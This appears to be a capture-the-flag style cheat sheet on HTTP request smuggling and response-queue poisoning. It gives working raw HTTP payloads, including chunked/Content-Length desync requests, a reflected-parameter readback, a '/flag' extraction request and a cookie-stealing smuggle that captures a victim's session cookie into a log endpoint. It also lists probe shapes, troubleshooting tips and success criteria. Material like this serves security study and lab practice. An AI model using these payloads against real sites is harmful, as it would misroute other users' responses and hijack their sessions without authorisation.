# Response poisoning — the queue-poison readback

## The shape — the smuggled prefix lands on the NEXT request

Every desync's practical form is **request-queue poisoning** — the
smuggled bytes sit in front of the next request on the shared connection:

```text
yours:    POST / HTTP/1.1 ... [smuggle: GET /poison HTTP/1.1]
victim's: GET /home HTTP/1.1

back-end sees:  GET /poison GET /home HTTP/1.1   — malformed, or
                GET /poison   +   GET /home      — two requests
```

The victim's request is the poison's BODY, or the victim's request
gets the poison's RESPONSE — the queue is poisoned.

## The response-mismatch — the victim gets the wrong response

```text
yours:    POST / ... [smuggle: GET /internal HTTP/1.1]
victim's: GET /public HTTP/1.1

victim receives: the /internal response — not /public
```

The victim's response is the smuggle's output — the response-queue is
misaligned — every subsequent victim gets a shifted response.

## The self-poison — your own next request reads the smuggle

```text
POST / HTTP/1.1
Content-Length: 60

GET /my-marker HTTP/1.1
Host: t

GET / HTTP/1.1
```

Send the desync then a normal `GET /` — the GET's response is `/my-marker`'s
— the self-poison readback — the smuggle ran and you see its output.

## The reflected-param readback — the echo

```text
POST /search?q=x HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /search?q=POISONED HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

`/search` echoes `q` — the smuggle's `q=POISONED` lands on the next
/search — the next response echoes `POISONED` — a self-serve readback.

## The cookie-steal — the smuggle's `Cookie:` header takes the victim's

```text
POST / HTTP/1.1
Content-Length: 90

POST /log HTTP/1.1
Host: t
Cookie: 
```

The smuggle's `Cookie:` is empty — the NEXT request's `Cookie: real=value`
lands INSIDE the smuggle's Cookie header → `/log` records the victim's
cookie — session-hijack — `session-hijack.md`.

## The response-desync — the back-end answers a request the front never saw

The clean signal: the back-end returns TWO responses for one request — the
front-end delivers one, the second sits queued — the NEXT requester gets
the queued response — a shifted queue.

## The poison-sweep — the probe shapes

| Shape | Effect |
|---|---|
| `GET /poison-marker` smuggle | next response is marker's output |
| `GET /search?q=X` smuggle | next response echoes X |
| `POST /log Cookie:` smuggle | victim's cookie in /log |
| `GET /404` smuggle | next request 404s |

## The detection — the shifted-response

```text
smuggle → send a NORMAL request → response is the smuggle's output
```

The normal request's response is wrong — the smuggle's response went to
it — the queue is poisoned.

## The readback-extract — `GET /flag` smuggle

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The `/flag` response goes to the next requester — or to your next request —
the flag text is in the response — `evidence-rules.md` — the verbatim
excerpt.

## The common pitfalls — the poison's failure modes

- the smuggle's `Host:` doesn't match the vhost → the smuggle 404s
- the smuggle's `Content-Length` is wrong → the smuggle hangs
- the connection closes after your request → the poison never lands
- a WAF strips the smuggle → no queue-poison, just a 400

## The evidence bar — what confirms

- a response arrives that corresponds to NO request you sent
- the next request's response carries the smuggle's marker
- the victim's request inherits your smuggled prefix
